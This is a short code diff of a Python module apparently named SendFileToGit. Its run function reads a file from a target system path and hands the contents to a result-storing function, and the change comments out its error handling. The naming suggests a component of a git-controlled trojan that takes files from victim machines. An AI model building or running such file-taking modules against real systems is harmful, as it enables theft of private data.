@@ -20,12 +20,12 @@ def store_module_result(data):
 	return
 
 def run(**args):
-	try:
-		fich = open(TargetOSfilePath, "r")
-		content = fich.read()
-		fich.close()
-		print("Je suis SendFile...")
-		store_module_result(content)
-		return "SendFileToGit: Successfully sent"
-	except:
-		return "SendFileToGit: File %s not found"% TargetOSfilePath
+	#try:
+	fich = open(TargetOSfilePath, "r")
+	content = fich.read()
+	fich.close()
+	print("Je suis SendFile...")
+	store_module_result(content)
+	return "SendFileToGit: Successfully sent"
+	#except:
+	#return "SendFileToGit: File %s not found"% TargetOSfilePath
